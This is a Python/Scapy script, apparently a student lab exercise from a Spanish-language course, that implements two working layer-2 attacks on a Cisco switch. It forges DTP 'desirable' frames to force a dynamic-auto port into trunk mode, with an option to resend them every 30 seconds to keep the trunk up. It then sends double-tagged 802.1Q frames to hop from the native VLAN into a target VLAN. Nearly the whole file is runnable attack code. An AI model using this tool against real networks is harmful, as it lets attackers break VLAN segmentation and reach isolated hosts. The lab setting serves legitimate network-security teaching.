#!/usr/bin/env python3
# DTP VLAN HOPPING TOOL | Matricula: 2023-0316 | ITLA
# Topologia comun a los 3 ataques:
#   Internet -> Router Fa0/0:20.23.3.1 -> Fa0/1 -> SW-L2
#   SW-L2 Gig0/0:router Gig0/1:Kali(20.23.3.16) Gig0/2:Victima(20.23.3.50) Gig0/3:PC-Admin(20.23.3.65)
#   Gig0/1 en DYNAMIC AUTO <- puerto vulnerable
#
# Uso:
#   sudo python3 dtp_vlan_hopping.py -m dtp
#   sudo python3 dtp_vlan_hopping.py -m hopping --vlan-nativa 1 --vlan-objetivo 30 --ip-destino 20.23.3.65
#   sudo python3 dtp_vlan_hopping.py -m ambos -p

from scapy.all import *
import struct, argparse, sys, time, threading, os

INTERFAZ  = "eth0"
MAC_DTP   = "01:00:0c:cc:cc:cc"
INTERVALO = 30
_activo   = True

def banner():
    print("DTP VLAN HOPPING | Matricula: 2023-0316 | ITLA")
    print("Topologia: Kali eth0 -> SW-L2 Gig0/1 (dynamic auto)")
    print("  Gig0/2: Victima 20.23.3.50 | Gig0/3: PC-Admin 20.23.3.65 (VLAN 30)")

def get_mac(iface):
    try:    return get_if_hwaddr(iface)
    except: return "00:de:ad:be:ef:16"

def snap_dtp():
    return b"\xaa\xaa\x03\x00\x00\x0c\x20\x04"

def tlv(tipo, valor):
    return struct.pack(">HH", tipo, 4 + len(valor)) + valor

def payload_dtp(mac):
    mb = bytes(int(x, 16) for x in mac.split(":"))
    return (tlv(0x0001, b"\x01") +
            tlv(0x0002, b"\x00" * 32) +
            tlv(0x0003, b"\x81\x42") +
            tlv(0x0004, b"\x81\x42") +
            tlv(0x0005, mb))

def enviar_dtp(iface, mac, verbose=True):
    frame = Ether(src=mac, dst=MAC_DTP) / Raw(load=snap_dtp() + payload_dtp(mac))
    if verbose:
        print(f"[*] DTP Desirable -> {MAC_DTP}")
        print(f"    MAC: {mac} | Puerto: SW-L2 Gig0/1 (dynamic auto)")
    sendp(frame, iface=iface, verbose=False)
    if verbose: print("[+] Trama DTP enviada - negociando TRUNK en Gig0/1")

def hopping(iface, mac, vlan_nat, vlan_obj, ip_dst):
    print(f"\n[DEMO] Doble Encapsulacion 802.1Q")
    print(f"  VLAN Nativa (outer): {vlan_nat}")
    print(f"  VLAN Objetivo (inner): {vlan_obj} -> {ip_dst}")
    print(f"  Ruta: Kali Gig0/1 -> SW-L2 despoja outer -> VLAN {vlan_obj} Gig0/3")
    frame = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
             Dot1Q(vlan=vlan_nat) / Dot1Q(vlan=vlan_obj) /
             IP(dst=ip_dst) / ICMP())
    sendp(frame, iface=iface, verbose=False, count=3)
    print(f"[+] 3 frames enviados a VLAN {vlan_obj} via hopping")

def persistente(iface, mac, intervalo):
    global _activo
    n = 0
    while _activo:
        n += 1
        enviar_dtp(iface, mac, False)
        print(f"[~] Re-envio DTP #{n} - trunk activo | Ctrl+C para detener")
        time.sleep(intervalo)

def main():
    global _activo
    banner()
    p = argparse.ArgumentParser(description="DTP VLAN Hopping | 2023-0316 | ITLA")
    p.add_argument("-i", "--interfaz",    default=INTERFAZ)
    p.add_argument("-m", "--modo",        choices=["dtp","hopping","ambos"], required=True)
    p.add_argument("--vlan-nativa",       type=int, default=1)
    p.add_argument("--vlan-objetivo",     type=int, default=30)
    p.add_argument("--ip-destino",        default="20.23.3.65")
    p.add_argument("-p", "--persistente", action="store_true")
    a = p.parse_args()
    mac = get_mac(a.interfaz)
    print(f"Config: interfaz={a.interfaz} ({mac}) modo={a.modo}\n")

    if a.modo in ["dtp", "ambos"]:
        print("[ATAQUE] Negociacion DTP Desirable -> TRUNK en SW-L2 Gig0/1")
        enviar_dtp(a.interfaz, mac)
        if a.persistente:
            t = threading.Thread(target=persistente,
                                 args=(a.interfaz, mac, INTERVALO), daemon=True)
            t.start()

    if a.modo in ["hopping", "ambos"]:
        time.sleep(2)
        hopping(a.interfaz, mac, a.vlan_nativa, a.vlan_objetivo, a.ip_destino)

    if a.persistente and a.modo in ["dtp", "ambos"]:
        try:
            print("\nTrunk activo. Ctrl+C para terminar...")
            while True: time.sleep(1)
        except KeyboardInterrupt:
            _activo = False
            print("\n[!] Detenido")

if __name__ == "__main__":
    if os.geteuid() != 0: sys.exit("[!] sudo requerido")
    main()
